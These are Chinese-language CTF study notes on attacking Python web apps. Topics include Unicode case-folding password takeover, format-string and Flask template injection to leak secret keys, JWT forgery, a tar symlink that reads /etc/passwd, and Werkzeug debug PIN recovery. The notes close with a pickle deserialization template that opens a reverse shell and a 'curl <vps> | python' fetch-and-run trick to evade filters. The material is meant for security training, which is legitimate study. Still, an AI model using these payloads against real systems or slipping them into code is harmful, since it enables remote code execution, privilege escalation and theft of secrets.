#Twisted是用Python实现的基于事件驱动的网络引擎框架，
from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep
#其中nodeprep.prepare实现大写字母转为小写
#若没有使用python自己的lower()函数，而是利用nodeprep.prepare实现大写转换，存在以下编码方面的问题
#当进行转换的字母为ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘʀꜱᴛᴜᴠᴡʏᴢ，转换结果为ᴀ -> A，若再进行一次转换结果为A -> a
#可以用于如下场景 用户名登录、修改密码等操作都进行了大写转换小写，使用ᴀdmin注册，登录ᴀdmin服务器将其处理为Admin，再修改密码，被处理为admin
#这样就重置了admin管理员的密码






#python字符串格式化漏洞
config = {'SECRET_KEY': 'f0ma7_t3st'}
class User(object):
	def __init__(self,name):
		self.name=name

#name=user.__class__.__init__.__globals__
user=User('tom')
print ('Hello {name}').format(name=user.__class__.__init__.__globals__)
'''输出结果： 这样可以读到config
Hello {'__builtins__': <module '__builtin__' (built-in)>, '__file__': 'test.py',
 '__package__': None, 'User': <class '__main__.User'>, '__name__': '__main__', '
config': {'SECRET_KEY': 'f0ma7_t3st'}, '__doc__': None, 'user': <__main__.User o
bject at 0x024BF230>}
... 
  #这里利用的时候难点在于 __xxx__ 怎么写，其中.__class__指的是当前类名
      #在第四届百越杯的Easy flask 中的利用方式为{user_m.__class__.__base__.__class__.__init__.__globals__[current_app].config}
      #由于可注入的对象 user_m 是继承自 SQLAlchemy 对象，我们在查阅其源码时发现在开头处导入了 current_app 对象。
#这里也是模板注入的问题，除了诸如用户名等位置可能出现这个问题外还有url，比如在第一次摸底测试中出现的flask题目中，
#url为 http://xx.xx.xx/user       当改成http://xx.xx.xx/user.{{config}}时可以泄露诸如密钥等所有相关信息
#这种类型的漏洞进行测试的时候可以用http://xx.xx.xx/user.{{7%2b7}}    %2b是+号，看服务端是否对7+7进行了计算，一定要注意在url中测试的时候输入要进行url
编码
#中期测试的flask模板注入的写法是http://106.14.114.127:33005/index.{{url_for.__globals__['current_app'].config}}，找到其JWT_SECRET_KEY，然后
伪造session，将普通用户改为admin权限，   url_for是通用的，遇到题目可以尝试下





#解、编辑jwt的网站   https://jwt.io/        注意下使用该网站时，选项 secret base64 encoded 是否要选上要观察初始的jwt是否使用了base64编码，不是必选的





#关于软链接的一个知识点
#某题让上传tar包，后台会自动解包，之后我可以访问这个tar包中的文件
#当我访问我上传的txt文件的时候会显示该文件的内容，而当我访问上传php文件的时候会显示下载
#这样就导致我没有办法执行命令，且该题没法通过url进行任意文件读取
#考点就在于可以读取自己上传的文件
#此时，做法为本地创建一个软链接   ln -s /etc/passwd  ruanlianjie.txt ,这样会生成ruanlianjie.txt，打开显示的是/etc/passwd的内容
#将其打包成tar包上传，后台解包释放出该软链接文件，然后我访问该文件，则会显示服务器/etc/passwd文件的内容，实现任意文件读取



#pin码的问题
#获取pin码需要获取以下信息
#username  就是启动这个flask的用户
#modname   为flask.app
#getattr(app,'__name__',getattr(app.__class__,'__name__'))    为Flask
#getattr(mod,'__file__',None)    为flask目录下的一个app.py的绝对路径
#uuid.getnode() 就是当前电脑的MAC地址，str(uuid.getnode())则是mac地址的十进制表达式,
					获取网卡mac地址 /sys/class/net/eth0/address，需转换为10进制地址>>> print(0x0242ac110001)
#get_machine_id()        /etc/machine-id或者 /proc/sys/kernel/random/boot_i中的值，若有就直接返回
#当存在文件读取或者模板注入的时候可能能获得以上这些值
#获取pin码是为了能够获得远程调试程序的权限，所以也就是说这个题还需要存在能够让人在浏览器中进行代码调试的问题
#要进入到验证PIN码执行shell的界面需要使程序报错，如何使其报错，可以通过更改post数据，比如正常的post数据为username=qweasd&password=qweasd
#那么我可以改成userna=qweasd&paword=qweasd诸如此类方式，破坏正常的数据，这样就可以进入到错误页面





#python中执行shell的几种方式
os.system('cat /proc/cpuinfo')   这种只会返回执行结果是0或者1
os.popen('cat /etc/passwd').read()  可以看到执行的输出，但是得不到0或者1的执行结果，一般用这个命令就足够
(status, output) = commands.getstatusoutput('cat /proc/cpuinfo')  print(status, output）  可以看到输出和返回值


#eval函数问题
eval()函数十分强大，官方demo解释为：将字符串str当成有效的表达式来求值并返回计算结果
那么当eval参数可控时便存在命令注入的问题，如
a=$_GET['q']
eval(a)
还有一种情况，在eval中可以使用#注释掉后面的部分，如
a='qwe'
print(eval(a+'bb'))
输出为qwebb
但是当a='qwe#'时
输出为qwe
这种情况适用于以下场景，某题目定义了多个函数，如a_handler,b_handler,a_new,b_new
eval(action + ('_handler'))
eval的参数仅部分可控，即action,这句代码出现的位置本应只能执行a_handler或者b_handler函数，但是我想执行a_new函数
因此可以控制action的值为 a_new#



python中的魔术方法：
__str__、__repr__ 在执行含有这两个魔术方法的类时，会自动执行


python反序列化（要注意python2和3序列化出来的数据是不同的）

pickle是为了序列化/反序列化一个对象的，可以把一个对象持久化存储。
python + pickle + ctf + session的情况下，以下为通用模板
import  pickle
import os
import base64
class User(object):
def __reduce__(self):
        return (os.system,("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",23333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",))    
shellcode=pickle.dumps(User())
print(base64.b64encode(shellcode))
在实际题目中,system可能被禁掉了，这时就需要更改能够执行命令的函数，比如 import command  使用 commands.getoutput
要执行的命令是一个反弹shell的，但是关于反弹shell如何写的问题，老师提供的他的写法是：
将反弹shell的命令写到vps上，即访问该vps响应内容就是反弹shell的代码，然后我通过在准备攻击的机器上执行下面这个命令（ip为我的vps）
curl 11.12.11.11 | python
这样curl之后得到的响应就是反弹shell的代码，然后被管道符输给python去执行，这样做的目的就是避免反弹shell的命令过长，被check